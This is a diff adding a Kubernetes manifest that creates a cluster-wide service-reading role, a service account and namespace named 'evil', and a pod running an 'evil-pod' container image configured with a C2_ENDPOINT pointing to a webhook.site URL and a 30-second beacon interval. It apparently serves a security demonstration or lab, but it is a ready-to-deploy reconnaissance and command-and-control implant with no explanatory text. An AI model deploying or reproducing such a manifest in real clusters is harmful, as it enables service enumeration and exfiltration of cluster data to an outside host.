@@ -1,0 +1,45 @@
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: service-reader
+rules:
+- apiGroups: [""]
+  resources: ["services"]
+  verbs: ["get", "list", "watch"]
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: evil-sa
+  namespace: evil-here
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: service-reader-binding
+subjects:
+- kind: ServiceAccount
+  name: evil-sa
+  namespace: evil-here
+roleRef:
+  kind: ClusterRole
+  name: service-reader
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: evil-pod
+  namespace: evil-here
+spec:
+  serviceAccountName: evil-sa
+  containers:
+  - name: evil-pod
+    image: ghcr.io/rileydakota/evil-pod:latest
+    env:
+    - name: TARGET_NS
+      value: "evil-here"
+    - name: C2_ENDPOINT
+      value: "https://webhook.site/546ef4d5-d1f6-41b6-9bc8-eedde20e609f"
+    - name: C2_INTERVAL
+      value: "30"
